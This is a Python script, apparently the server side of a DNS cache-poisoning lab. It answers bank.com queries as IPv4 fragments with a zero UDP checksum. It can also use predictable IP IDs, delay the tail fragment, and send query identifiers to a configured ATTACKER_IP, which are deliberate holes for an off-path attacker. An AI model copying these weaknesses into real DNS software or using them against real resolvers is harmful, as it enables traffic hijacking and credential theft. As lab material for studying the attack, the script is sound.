#!/usr/bin/env python3
"""Authoritative DNS: bank.com as IPv4 fragments with UDP checksum 0."""
from __future__ import annotations

import json
import os
import random
import socket
import struct
import time

from dnslib import A, DNSHeader, DNSRecord, QTYPE, RR
from scapy.all import IP, Raw, send  # type: ignore

LISTEN_IP = os.getenv("AUTH_IP", "10.80.0.100")
AUTH_IP = LISTEN_IP
ATTACKER_IP = os.getenv("ATTACKER_IP", "10.80.0.200")
NOTIFY_PORT = int(os.getenv("NOTIFY_PORT", "9999"))
DELAY = float(os.getenv("AUTH_DELAY_SECONDS", "0.25"))
FRAGSIZE = int(os.getenv("FRAGSIZE", "40"))
IPID_SPACE = int(os.getenv("IPID_SPACE", "2048"))
IPID_MODE_FILE = "/app/ipid_mode"
TAIL_MODE_FILE = "/app/bank_tail_mode"
NOTIFY_FILE = "/app/notify_attacker"
BANK_IP = os.getenv("BANK_REAL_IP", "203.0.113.80")
ZONE_IP = os.getenv("ZONE_IP", "198.51.100.10")


def read_file(path: str, default: str) -> str:
    try:
        text = open(path, encoding="utf-8").read().strip().lower()
        return text or default
    except FileNotFoundError:
        return default


def pick_ipid() -> int:
    text = read_file(IPID_MODE_FILE, "random")
    if text.startswith("fixed"):
        if ":" in text:
            return int(text.split(":", 1)[1])
        return 777
    return random.randint(0, max(1, IPID_SPACE - 1))


def is_bank(qname: str) -> bool:
    name = qname.lower().rstrip(".")
    return name == "bank.com" or name.endswith(".bank.com")


def build_dns(request: DNSRecord, answer_ip: str) -> bytes:
    qname = str(request.q.qname)
    header = DNSHeader(id=request.header.id, qr=1, aa=1, ra=0, rd=request.header.rd)
    response = DNSRecord(header, q=request.q)
    response.add_answer(RR(qname, QTYPE.A, rdata=A(answer_ip), ttl=30))
    return bytes(response.pack())


def udp_payload(dport: int, body: bytes) -> bytes:
    return struct.pack("!HHHH", 53, dport, 8 + len(body), 0) + body


def ip_fragments(dst: str, ipid: int, payload: bytes):
    size = max(8, (FRAGSIZE // 8) * 8)
    offset = 0
    packets = []
    while offset < len(payload):
        chunk = payload[offset : offset + size]
        mf = 1 if offset + size < len(payload) else 0
        packets.append(
            IP(src=AUTH_IP, dst=dst, id=ipid, ttl=64, proto=17, flags=mf, frag=offset // 8) / Raw(chunk)
        )
        offset += size
    return packets


def notify_attacker(ipid: int, dport: int, dns_id: int, qname: str, dns_len: int) -> None:
    if read_file(NOTIFY_FILE, "off") != "on":
        return
    payload = json.dumps(
        {"ipid": ipid, "dport": dport, "dns_id": dns_id, "qname": qname, "dns_len": dns_len}
    ).encode("utf-8")
    notify = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        notify.sendto(payload, (ATTACKER_IP, NOTIFY_PORT))
    finally:
        notify.close()


def main() -> None:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((LISTEN_IP, 53))
    print(f"[auth] split-frag bank.com fragsize={FRAGSIZE} delay={DELAY} on {LISTEN_IP}:53", flush=True)
    while True:
        payload, (src_ip, src_port) = sock.recvfrom(4096)
        try:
            request = DNSRecord.parse(payload)
        except Exception:
            continue
        qname = str(request.q.qname)
        ipid = pick_ipid()
        body = build_dns(request, BANK_IP if is_bank(qname) else ZONE_IP)
        if is_bank(qname):
            frags = ip_fragments(src_ip, ipid, udp_payload(src_port, body))
            send(frags[0], verbose=0)
            tail = read_file(TAIL_MODE_FILE, "send") != "omit"
            if tail and len(frags) > 1:
                if DELAY > 0:
                    time.sleep(DELAY)
                send(frags[1:], verbose=0)
            notify_attacker(ipid, src_port, int(request.header.id), qname, len(body))
            print(
                f"[auth] bank ipid={ipid} frags={len(frags)} tail={tail} dnslen={len(body)} -> {src_ip}:{src_port}",
                flush=True,
            )
            continue
        frags = ip_fragments(src_ip, ipid, udp_payload(src_port, body))
        send(frags, verbose=0)
        print(f"[auth] q={qname} ipid={ipid} frags={len(frags)} -> {src_ip}:{src_port}", flush=True)


if __name__ == "__main__":
    main()
